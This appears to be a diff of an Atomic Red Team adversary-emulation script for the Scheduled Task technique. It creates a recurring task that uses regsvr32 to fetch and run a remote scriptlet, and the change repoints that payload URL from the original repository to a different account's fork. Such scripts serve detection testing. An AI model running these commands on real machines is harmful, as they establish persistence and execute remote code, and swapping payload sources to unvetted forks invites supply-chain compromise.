@@ -9,7 +9,7 @@
 # Technique: Scheduled Task https://attack.mitre.org/wiki/Technique/T1053
 # Create Scheduled Task With RegSv32 Payload
 
-SCHTASKS /Create /SC MINUTE /TN "Atomic Testing" /TR "regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/6965fc15ef872281346d99d5eea952907167dec3/atomics/T1117/RegSvr32.sct scrobj.dll" /mo 30
+SCHTASKS /Create /SC MINUTE /TN "Atomic Testing" /TR "regsvr32.exe /s /u /i:https://raw.githubusercontent.com/theclintox/atomic-red-team/6965fc15ef872281346d99d5eea952907167dec3/atomics/T1117/RegSvr32.sct scrobj.dll" /mo 30
 
 SCHTASKS /Run /TN "Atomic Testing"
 
